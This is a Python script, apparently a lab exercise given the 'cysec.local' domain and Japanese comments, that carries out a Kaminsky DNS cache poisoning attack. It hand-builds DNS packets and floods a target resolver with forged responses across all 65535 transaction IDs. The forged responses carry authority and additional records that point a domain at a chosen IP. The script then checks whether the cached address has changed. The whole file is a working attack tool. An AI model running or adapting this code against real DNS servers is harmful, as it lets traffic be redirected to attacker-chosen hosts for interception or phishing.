#!/usr/bin/env python3
# coding: UTF-8

import sys
import socket
import struct
import time

argvs = sys.argv
argc = len(argvs)

# TODO consider argvs
if argc != 2:
    print ('Usage: python %s  (Target DNS Address) #(Poison IP Address)' % argvs[0])
    sys.exit(1)

DNS = argvs[1]   # Target DNS
POISON_IP = "216.58.197.14" # argvs[2] # Request IP Address (Google Address)
RANDOM_IP = "192.168.2.101"
URL = "web.server.cysec.local" #argvs[3]  # Request URL
PORT = 53       # DNS Port
LEN = 512       # maxLen bits

binary_num = []

def initialize():
    binary_num.append(b'\x00\x00')
    for i in range(1, 65536):
        binary_num.append(i.to_bytes(2, 'big'))


# URL xxx.yyyy.zz
# convert -> 3xxx4yyyy2zz
def convert_dns_url(url):
    dns_url = ""
    url_a = url.split(".")
    for array in url_a:
        dns_url += str(len(array))
        for c in array:
            dns_url += c

    return dns_url

def convert_16_bits(num):
    return num.to_bytes(2, 'big')

def convert_url_dnsformat(url):
    url_con = convert_dns_url(url)
    url_len = len(url_con) 
    
    format = b''
    for c in url_con:
        if c.isdigit():
            c = int(c)
        else:
            c = ord(c)
        format += c.to_bytes(1, 'big')

    format += b'\x00'

    return format

def convert_ip_dnsformat(ip_address):
    format = b''
    address_a = ip_address.split(".")
    for address in address_a:
        format += int(address).to_bytes(1, 'big')

    return format

# Generate DNS Request
# for a server status request, we only need a header
# header format is described in RFC 1035
def header_request(qr, qdcount, ancount, nscount, arcount):

    #qr      = 1 << 15 # qr = 1      => query (response)
    opcode  = 0 << 11 # opcode = 0  => standard request
    aa      = 1 << 10
    tc      = 0 << 9
    rd      = 1 << 8
    ra      = 0 << 7
    z       = 0 << 6
    ad      = 0 << 5
    cd      = 0 << 4
    rcode   = 0 << 0

    #qdcount = 1
    #ancount = 1
    #nscount = 1
    #arcount = 2

    # convets 16bit bits array
    #f1 = binary_num[id]
    f2 = binary_num[qr + opcode + aa + tc + rd + ra + z + ad + cd + rcode]
    f3 = binary_num[qdcount]
    f4 = binary_num[ancount]
    f5 = binary_num[nscount]
    f6 = binary_num[arcount]

    header = f2 + f3 + f4 + f5 + f6

    return header

def question_request(url):
    # Refere:http://www5e.biglobe.ne.jp/%257eaji/3min/66.html
    qname = url
    qtype = 1   # A record
    qclass = 1  # default is 1 (InternetClass IN=1)

    # convets 16bit bits array
    f1 = convert_url_dnsformat(url)
    f2 = binary_num[qtype]
    f3 = binary_num[qclass]
    
    question = f1 + f2 +f3

    return question

def answer_request(i):
    name    = convert_url_dnsformat('nx' + '{0:05d}'.format(i)  + '.' + URL)
    type    = 1     # A host address
    class_  = 1     # IN (Internet)
    ttl     = 3600  # 1 hour
    rdlen   = 4     # Data Length
    rdata   = convert_ip_dnsformat(RANDOM_IP)

    
    # convets 16bit bits array
    f1 = name
    f2 = binary_num[type]
    f3 = binary_num[class_]
    f4 = ttl.to_bytes(4, 'big')
    f5 = binary_num[rdlen]
    f6 = rdata

    answer = f1 + f2 + f3 + f4 + f5 + f6

    return answer

def authority_request():
    name    = b'\xC0\x14'
    type    = 2     # NS (an authoritative Name Server)
    class_  = 1
    ttl     = 3600  # 1 hour
    rdlen   = 2     # Data Length
    rdata   = name #b'\xC0\x0C'

    f1 = name
    f2 = binary_num[type]
    f3 = binary_num[class_]
    f4 = ttl.to_bytes(4, 'big')
    f5 = binary_num[rdlen]
    f6 = rdata

    authority = f1 + f2 + f3 + f4 + f5 + f6

    return authority

# TODO メッセージ圧縮
# nx000?.web.server.cysec.local決め打ち
def additional_request(i):
    name    = b'\xC0\x14' # メッセージ圧縮
    type    = 1
    class_  = 1
    ttl     = 3600  # 1 hour
    rdlen   = 4     # Data Length
    rdata   = convert_ip_dnsformat(POISON_IP)

    f1 = name
    f2 = binary_num[type]
    f3 = binary_num[class_]
    f4 = ttl.to_bytes(4, 'big')
    f5 = binary_num[rdlen]
    f6 = rdata
    
    additional = f1 + f2 + f3 + f4 + f5 + f6

    return additional

def additional_dnssec_request():
    name    = 0     # <Root>
    type    = 41#29    # OPT (EDNS0 option)
    size    = 512#4096  # UDP payload size
    rcode   = 0     
    version = 0     # EDNS0 Version
    z       = b'\x80\x00'
    length  = 0     # Data Length

    # convert binary array
    f1 = name.to_bytes(1, 'big')
    f2 = binary_num[type]
    f3 = binary_num[size]
    f4 = rcode.to_bytes(1, 'big')
    f5 = version.to_bytes(1, 'big')
    f6 = z
    f7 = binary_num[length]

    additional = f1 + f2 + f3 + f4 + f5 + f6 + f7

    return additional

def convert_binary_to_IPstr(binary):
    ip = str(int.from_bytes(binary, 'big'))
    return ip

# return IP Address 
# from binary to str
# if check is True, receive data
def inquire_IP_Address(sock, req):
    # send the check query
    sock.send(req)    
    # receive response
    data = sock.recv(LEN)
    if data[0] == 255 and data[1] == 255:
        data = sock.recv(LEN)

    split_format = str(len(data)) + "c"
    split_b      = (struct.unpack(split_format, data))
    
    sp = str(len(req)) + "c"
    sp_b = (struct.unpack(sp, req))

    print (" Request:    ", end='')
    print (sp_b)
    print (" Response:   ", end='')
    print (split_b)


    question_head = 12
    next = int.from_bytes(split_b[question_head], 'big')
    while next != 0:
        question_head += next+1
        next = int.from_bytes(split_b[question_head], 'big')
    
    question_head += 1 # move to Type
    question_head += 4 # move Answer section

    next = int.from_bytes(split_b[question_head], 'big')
    while next != 0:
        if next == 192: # 192(C0??) is Message compression
            question_head += 2
            break
        question_head += next+1
        next = int.from_bytes(split_b[question_head], 'big')
    
    question_head += 10 # move to RDATA

    ip1 = convert_binary_to_IPstr(split_b[question_head])
    ip2 = convert_binary_to_IPstr(split_b[question_head+1])
    ip3 = convert_binary_to_IPstr(split_b[question_head+2])
    ip4 = convert_binary_to_IPstr(split_b[question_head+3])
   
    response_url    = ip1 + '.' + ip2 + '.' + ip3 + '.' + ip4
    
    return response_url

def main():
    # create kaminsky header ignore id
    kaminsky_header = header_request(qr=1, qdcount=1, ancount=1, nscount=1, arcount=2)

    # create solve header
    resolve_header = header_request(qr=0, qdcount=1, ancount=0, nscount=0, arcount=0)
        
    # create authority
    authority = authority_request()
    
    # create poisoning check
    poison_check_header = b'\x00\x01' + header_request(qr=0, qdcount=1, ancount=0, nscount=0, arcount=0)
    poison_check_question = question_request(URL)
    poison_check_req = poison_check_header + poison_check_question

    # create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((DNS,PORT))

    # get Original IP
    originalIP = inquire_IP_Address(sock, poison_check_req)

    count = 1
    while True:
        for i in range(1, 65536):
            start = time.time()
            # create question
            question = question_request('nx'+'{0:05d}'.format(i)+'.'+URL)

            # create answer
            answer = answer_request(i)

            # create additional
            additional = additional_request(i) + additional_dnssec_request()
            
            # create name resolve
            resolve_req = binary_num[i] + resolve_header + question
            
            # send solve query
            sock.send(resolve_req)

            data = sock.recv(LEN)

            # create DNS request message
            kaminsky_req = kaminsky_header + question + answer + authority + additional

            # send solve query
            sock.send(resolve_req)

            for j in range(1, 65536):
                # send kaminsky query
                sock.send(binary_num[j]+kaminsky_req)

                if i == 1 and j == 1:
                    # display DNS request message
                    print (" Request:  ", end='')
                    print (binary_num[j]+kaminsky_req)

                    data = sock.recv(LEN)
                    print (" RCODE:    ", end='')
                    split_format = str(len(data)) + "c"
                    rcode_b = (struct.unpack(split_format, data)[3])
                    print (int.from_bytes(rcode_b, 'big') % (1 << 4))

                # kaminsky attack response
                sock.recv(LEN)
            
            end = time.time() - start
            print (str(i) + "回目     " + str(end) + "[sec]")

            #time.sleep(5)
            # check IP Address 
            responseIP = inquire_IP_Address(sock, poison_check_req)
            print ("poisning check")
            print ("origin IP   :" + originalIP)
            print ("response IP :" + responseIP)
            #time.sleep(10)
            
            if responseIP != originalIP:
                print ("Poisoning 成功")
                print ("Loop回数は"+str(count)+"回でした")
                break

        count += 1
        if originalIP != responseIP:
            break

    sock.close()
    
if __name__ == '__main__':
    initialize()
    main()

